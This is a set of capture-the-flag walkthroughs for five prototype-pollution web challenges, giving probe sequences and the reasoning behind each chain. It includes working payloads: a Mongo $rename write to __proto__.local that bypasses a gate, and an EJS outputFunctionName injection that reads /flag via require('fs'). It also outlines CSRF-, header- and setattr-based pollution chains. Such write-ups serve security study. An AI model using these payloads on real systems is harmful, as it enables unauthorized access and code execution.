# CTF walkthroughs — the verified traces

Probe-by-probe walkthroughs of the five card-backed shapes. Each names
the observation, the chain, and where the flag was hiding.

---

## Walkthrough — Secure Notes (`htb-secnotes`)

**Observed.** Express + Mongo; a `/api/notes/update` endpoint taking
`{"filter": ..., "update": ...}`; a `local`-gated `/api/notes/read`
route.

**Probes.**

```
1. POST /api/notes/update {"filter":{"id":"<own>"},"$rename":
   {"title":"__proto__.ppmarker"}}            → 200
2. GET /api/notes/<new>                       → {"ppmarker":...}
   — global write confirmed
3. POST /api/notes/update {"filter":{"id":"<own>"},"$rename":
   {"title":"__proto__.local"}}
4. GET /api/notes/read                        → 200 (was 403)
   — the local gate reads config.local; the pollution set it
5. GET /api/notes/read                        → the notes, including
   the flag-bearing admin note
```

**The key insight.** `$rename` writes to a PATH — the path
`__proto__.local` reaches the prototype; the gate read
`config.local` which the pollution supplied. The second-order trap
avoided: only the `filter` + `$rename` went in — no content fields,
so no other doc was touched.

## Walkthrough — Chromatic (`cscv2026-chromatic`)

**Observed.** An admin-only `/api/admin/export-preview` accepting a
`theme` object; EJS rendering; an admin bot to relay.

**Probes.**

```
1. POST /api/admin/export-preview {"title":"t","theme":{"constructor":
   {"prototype":{"outputFunctionName":
   "x;__append('[PP-MARKER]');var y"}}}}    → 200
2. The render runs → response contains "[PP-MARKER]<!doctype html>"
   — generated code ran
3. The real payload: "x;__append(require('fs')
   .readFileSync('/flag','utf8'));var y"   → the flag in the HTML
```

**The key insight.** `theme` is a legitimate object the merge accepts;
`constructor.prototype` reaches `Object.prototype` through a name the
`__proto__` filter doesn't catch; `outputFunctionName` is raw JS
concatenated into `new Function` — the sink is the template compiler
itself. The 2.5s renderer worker contains the pollution per-job, so
each render is a fresh process — no cleanup needed.

## Walkthrough — TornadoService (`htb-tornadoservice`)

**Observed.** A settings write endpoint returning 403 for external
requests; an admin bot that visits URLs.

**Probes.**

```
1. GET /api/public → object id; POST /api/settings direct → 403
2. Build a page that POSTs the pollution payload via the bot's session
3. Bot visits → the bot's session carries the write → the app's
   global setting (a Python class attribute) flips
4. The gated route now reads the polluted attribute → flag
```

**The key insight.** The write was local-only — the BOT is local. CSRF
delivered the pollution; the class-attribute write changed a global
the app reads on every check.

## Walkthrough — NovaCore (`htb-novacore`)

**Observed.** A proxy in front of the API; `Connection` header
accepted.

**Probes.**

```
1. GET /api/x  → 401 (token-gated)
2. GET /api/x  with Connection: <proxy-header> + the header → passes
   the proxy's own auth check — the header reaches the app
3. The header's value is merged into a request-scoped config →
   pollutes the object the app's response-builder reads → DOM
   clobber in the rendered page → polyglot XSS → plugin RCE
```

**The key insight.** The merge site is unreachable directly — the
proxy adds the carrier. The pollution payload rides a HEADER value
the proxy injects.

## Walkthrough — Artificial University (`htb-artificial-university`)

**Observed.** gRPC service, reflection on; a protobuf schema with
attribute-mapped fields.

**Probes.**

```
1. gRPC reflection → field names in the schema
2. setattr-path payload via a field → reaches a Python
   __globals__-adjacent attribute
3. The eval-adjacent attribute evaluates on next call → flag
```

**The key insight.** The attribute names come from the schema — the
schema IS the attack map. `setattr` per field walks into the object
graph.

## The common spine

Every trace follows: carrier (a legit nested object) → write
primitive (`__proto__`/`constructor`/dotted-path/`$rename`/attribute)
→ prototype/class object → readable fallback (`isAdmin`/`local`/
`outputFunctionName`/`env`) → trigger request → flag. The first
confirm is always a harmless marker or a non-destructive gate-flip —
never the flag payload first.
